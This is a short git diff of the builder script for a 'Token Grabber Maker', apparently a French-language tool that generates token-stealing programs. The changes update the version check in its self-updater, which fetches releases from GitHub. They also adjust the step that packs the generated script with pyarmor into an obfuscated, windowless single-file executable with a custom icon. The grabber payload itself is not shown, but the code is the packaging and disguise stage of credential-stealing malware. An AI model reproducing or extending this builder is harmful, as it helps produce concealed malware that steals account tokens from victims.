@@ -30,7 +30,7 @@ except:
 def build():
     version = requests.get("https://raw.githubusercontent.com/Teobre/TokenGrabberMaker/main/Files/version")
     ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Version {version.text} | Créé par Teobre#0787")
-    if version.text != "1.0.5\n":
+    if version.text != "1.0.6\n":
         print("Une nouvelle version est disponible, le téléchargement est en cours.")
         ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Mise à jour en cours... | Créé par Teobre#0787")
         new_version = requests.get("https://github.com/Teobre/TokenGrabberMaker/archive/main.zip")
@@ -88,7 +88,7 @@ def build():
             os.chdir('Executable\\')
             icon = value['iconpath']
             name = value['name']
-            os.system(f"""{sys.executable} -m pyarmor pack -e \" --noconsole -F '--icon={icon}'\" \"{os.getcwd()}\\{name}.py\"""")
+            os.system(f"""pyarmor pack -e \" --noconsole -F '--icon={icon}'\" \"{os.getcwd()}\\{name}.py\"""")
             shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\{name}.exe")
             shutil.rmtree('build')
             shutil.rmtree('dist')
